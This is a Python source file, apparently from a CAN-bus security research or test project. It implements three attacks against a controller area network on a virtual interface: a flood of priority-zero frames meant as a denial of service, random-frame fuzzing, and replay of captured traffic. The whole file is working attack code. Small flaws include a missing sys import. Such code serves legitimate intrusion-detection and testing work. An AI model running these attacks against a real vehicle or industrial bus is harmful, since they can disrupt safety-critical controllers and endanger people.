# attacks.py
#
# purpose: implements all attack types
# note: options to control the length of the attack, when they occur, etc.
#       will be added in the future

from data import utils
import can
import random

ARBITRATION_MAX = 2 ** 11 - 1
DATA_MAX        = 2 ** 8 - 1

can.rc['interface'] = 'socketcan_ctypes'
can.rc['channel'] = 'vcan0'
bus = can.interface.Bus()

def dos():
    """Perform a denial of service attack"""
    msg = can.Message(arbitration_id=0x0,
                      data=[0, 0, 0, 0, 0, 0, 0, 0],
                      extended_id=False)
    for i in range(1000):
        bus.send(msg)

def fuzz():
    random.seed()
    for i in range(1000):
        data_list = []
        for i in range(8):
            data_list.append(random.randint(0, DATA_MAX))
        msg = can.Message(arbitration_id=random.randint(0, ARBITRATION_MAX),
            data=data_list, extended_id=False)
        bus.send(msg)

def fuzz_replay():
    # capture at least 8 messages before replaying
    replay_ref = []
    for _ in range(20):
        msg = bus.recv(timeout=1)
        if msg: replay_ref.append(msg)
        if len(replay_ref) >= 8:
            break
    else:
        print("Error: could not capture 8 messages within 20 seconds", file=sys.stderr)
        sys.exit(1)

    for _ in range(1000):
        # replay a random mesasge from the ones we've stored
        bus.send(random.choice(replay_ref))

        # capture a message to add to our reference
        msg = bus.recv(timeout=1)
        if msg: replay_ref.append(msg)
